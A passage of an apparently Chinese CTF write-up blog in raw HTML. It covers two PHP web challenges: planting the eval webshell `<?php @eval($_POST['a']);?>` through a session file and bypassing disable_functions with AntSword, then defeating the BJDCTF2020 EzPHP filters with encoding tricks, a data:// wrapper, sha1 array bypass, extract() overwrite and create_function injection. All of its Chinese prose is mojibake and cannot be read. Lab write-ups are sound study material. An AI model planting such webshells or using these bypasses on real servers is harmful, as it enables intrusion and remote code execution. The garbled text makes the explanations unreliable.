class="hljs-string">&quot;oldPassword&quot;</span>);<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;password&quot;</span>);<br>        <span class="hljs-variable">$where</span>[<span class="hljs-string">&quot;uid&quot;</span>] = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>);<br>        <span class="hljs-variable">$where</span>[<span class="hljs-string">&quot;password&quot;</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$oldPassword</span>);<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&quot;user&quot;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$where</span>)-&gt;<span class="hljs-title function_ invoke__">find</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-variable">$rePassword</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">update</span>([<span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)],[<span class="hljs-string">&quot;uid&quot;</span>=&gt; <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;UID&quot;</span>)]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$rePassword</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;ä¿®æ”¹æˆåŠŸ&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;ä¿®æ”¹å¤±è´¥&quot;</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&quot;code&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span> =&gt; <span class="hljs-string">&quot;åŸå¯†ç é”™è¯¯&quot;</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>            &#125;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>            &#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$record</span>);<br>                <span class="hljs-variable">$recordLen</span> = <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$recordArr</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$recordLen</span> &gt;= <span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$recordArr</span>);<br>                    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$record</span> . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;search&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯ä¸‹é¢è¿™å‡ ç‚¹ï¼š</p><p>sessionæ–‡ä»¶ï¼Œä¸€èˆ¬ä½äºé¡¹ç›®æ ¹ç›®å½•ä¸‹çš„<code>./runtime/session/</code>æ–‡ä»¶å¤¹ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>/runtime/session/sess_å‰å‰å‰.php</code>(æ³¨æ„è¿™é‡Œå+.phpè¦æ»¡è¶³32ä¸ªå­—ç¬¦)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br><span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>post</code>ä¼ <code>$data</code>ï¼Œç„¶åæŠŠå®ƒä¿å­˜åˆ°sessionä¸­é”®<code>record</code>å¯¹åº”çš„å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;      <br></code></pre></td></tr></table></figure><p>ç»™keyä¼ ä¸ªä¸€å¥è¯ï¼š<code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>ï¼Œç„¶åè®¿é—®ç›®æ ‡æ–‡ä»¶(æŒ‰ç†è¯´ä¼šæœ‰ä¸¤ä¸ªé”®å€¼å¯¹ï¼šuidå’Œkey)ï¼š</p><p><code>/runtime/session/sess_1234567890123456789012345678.php</code></p><p><img src="/img/easyyyyyyyythingking5.png" alt="easyyyyyyyythingking5"></p><p>æ²¡é—®é¢˜ï¼Œå…ˆçœ‹ç¯å¢ƒå˜é‡é‡Œæ˜¯å¦æœ‰flagï¼šæœ‰ï¼Œä¸è¿‡æ˜¯å‡çš„ï¼š</p><p><img src="/img/easythinking6.png" alt="easythinking6"></p><p>èšå‰‘è¿æ¥ï¼š</p><p><img src="/img/easythingking7.png" alt="easythingking7"></p><p><code>flag</code>æ²¡æ³•è¯»(ä¼°è®¡æ˜¯ç¦ç”¨äº†å¤§é‡å‡½æ•°ï¼Œphpinfoçš„disable_functionsé‡Œå¯ä»¥çœ‹åˆ°ã€‚æƒ³åˆ°ä¹‹å‰æå®¢å¤§æŒ‘æˆ˜é‡Œåšè¿‡ç±»ä¼¼çš„ï¼Œèšå‰‘æä¾›äº†ç»•è¿‡åŠŸèƒ½ï¼š</p><p><img src="/img/easythinking9.png" alt="easythinking9"></p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p><img src="/img/bjdctfezphp1.png" alt="bjdctfezphp1"></p><p>çœ‹æºç ï¼Œæ³¨æ„çº¢æ¡†ï¼š</p><p><img src="/img/bjdctfezphp2.png" alt="bjdctfezphp2"></p><p>å¤§å†™å­—æ¯åŠ æ•°å­—ç»„åˆï¼Œç­‰å·ç»“å°¾ï¼Œçœ‹ç€åƒ<code>base</code>å®¶æ—çš„ä½†ä¸æ˜¯<code>base64</code>?<code>base32</code>è§£ç å¾—åˆ°ï¼š<code>1nD3x.php</code>ï¼Œè®¿é—®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br>This is a very simple challenge <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> you solve it I will give you a flag. Good Luck!<br>Aqua is the cutest five-year-old child in the world! Isn<span class="hljs-string">&#x27;t it ?</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯<code>$_SERVER</code>è¿™ä¸ªè¶…å…¨å±€å˜é‡ï¼š</p><p><img src="/img/bjdctfezphp3.png" alt="bjdctfezphp3"></p><p>æœ‰æœåŠ¡å™¨ä¿¡æ¯èƒ½è®¿é—®æ—¶å®ƒå°±ä¸ºçœŸï¼Œæ¥ä¸‹æ¥æ˜¯<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>è¿™ä¸œè¥¿ï¼šå­˜å‚¨å½“å‰è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯ URL ä¸­é—®å·åé¢çš„éƒ¨åˆ†ï¼Œé€šå¸¸ç”¨äºå‘æœåŠ¡å™¨ä¼ é€’å‚æ•°ã€‚ä¸è¿‡æ³¨æ„è¿™ä¸œè¥¿ä¸ä¼š<code>URLDecode</code></p><p>æ¯”å¦‚å¯¹äºè¿™ä¸ª<code>URL</code>:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery">https://example.com/page.php<span class="hljs-built_in">?id</span>=<span class="hljs-number">123</span><span class="hljs-meta">%20name</span>=John<br><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>] ä¸º<span class="hljs-built_in"> id</span>=<span class="hljs-number">123</span><span class="hljs-meta">%20name</span>=John<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ä¸º John Doe<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªæ­£åˆ™<code>ban</code>äº†<code>debu,aqua,cute</code>å•¥çš„ï¼Œä½†æ¥ä¸‹æ¥çš„æ­£åˆ™åŒ¹é…å¾ˆæ˜æ˜¾è¦ç»™<code>debu</code>èµ‹å€¼ã€‚æ‰€ä»¥è¿™é‡ŒæŠŠè¿‡æ»¤çš„å­—ç¬¦<code>URL</code>ç¼–ç ä¸€ä¸‹å°±è¡Œã€‚</p><p>ç¬¬äºŒä¸ªæ­£åˆ™ï¼š<code>preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)</code></p><p>è¿™é‡Œä»¤<code>?debu=aqua_is_cute%0a</code>å°±è¡Œï¼Œå› ä¸ºéå¤šè¡Œæ¨¡å¼ä¸‹<code>$</code>è¿™ä¸ªä¸œè¥¿ä¼¼ä¹ä¼šå¿½ç•¥åœ¨å¥å°¾çš„<code>%0a</code></p><p>ç¬¬äºŒéƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p><code>$_REQUEST</code> è¶…å…¨å±€å˜é‡åŒ…å«äº† <code>$_GET</code>ã€<code>$_POST</code> å’Œ <code>$_COOKIE</code> è¶…å…¨å±€å˜é‡çš„åˆé›†ã€‚è¿™é‡Œä¼šéå†æ¯ä¸ªå­—ç¬¦ç„¶åè¿‡æ­£åˆ™åŒ¹é…(è¿‡æ»¤äº†æ‰€æœ‰å¤§å°å†™å­—æ¯)ã€‚</p><p>å‡å¦‚æˆ‘ä»¬<code>get</code>ä¼ ä¸€ä¸ª<code>a</code>,<code>post</code>ä¹Ÿä¼ ä¸€ä¸ª<code>a</code>ï¼Œé‚£ä¹ˆ<code>$_REQUEST[a]</code> ä¼šæ˜¯è°çš„å€¼å‘¢ï¼Ÿ</p><p>è¿™å–å†³äºä½ çš„php.iniä¸­çš„<code>variables_order</code>çš„è®¾ç½®ï¼Œé»˜è®¤ä¸ºï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">variables_order</span> = <span class="hljs-string">&quot;GPCS&quot;</span><br></code></pre></td></tr></table></figure><p>å®ƒä»¬çš„é¡ºåºå†³å®šäº† PHP åœ¨å¤„ç†è¶…å…¨å±€å˜é‡æ—¶çš„ä¼˜å…ˆçº§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ <code>variables_order = &quot;GPCS&quot;</code>ï¼Œé‚£ä¹ˆ PHP ä¼šå…ˆå°† <code>$_GET</code> çš„å€¼è½¬æ¢ä¸ºå…¨å±€å˜é‡ï¼Œç„¶åæ˜¯ <code>$_POST</code>ï¼Œæ¥ç€æ˜¯ <code>$_COOKIE</code>ï¼Œæœ€åæ˜¯ <code>$_SESSION</code>ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä»–å…ˆå–äº†getçš„å€¼ç„¶ååˆ¤æ–­æœ‰æ²¡æœ‰postçš„å€¼æœ‰çš„è¯å°±è¦†ç›–æ‰ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†è¦getä¼ å…¥çš„å‚æ•°postä¼ ä¸€ééå­—æ¯çš„å°±è¡Œã€‚</p><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†å¾ˆç®€å•ï¼Œ<code>file_get_contents</code>çš„åˆ¤æ–­æˆ‘ä»¬ç›´æ¥åˆ©ç”¨<code>data</code>ä¼ªåè®®å†™<code>debu_debu_aqua</code>åˆ°<code>file</code>é‡Œå°±å¥½ã€‚</p><p><code>data://text/plain,debu_debu_aqua</code></p><p>æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ªå“ˆå¸Œå¼ºç­‰äºï¼Œç›´æ¥æ•°ç»„ç»•è¿‡å°±è¡Œï¼š</p><p><code>$shana[]=1&amp;$passwd[]=2</code></p><p><code>extract($_GET[&quot;flag&quot;]);</code>ï¼šè¿›è¡Œå˜é‡è¦†ç›–ã€‚</p><p>ç¬¬å››éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä¸ä¼šåšã€‚ã€‚æŸ¥äº†<code>wp</code>å‘ç°è¿™ä¸œè¥¿å«<code>create_function</code>ä»£ç æ³¨å…¥ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 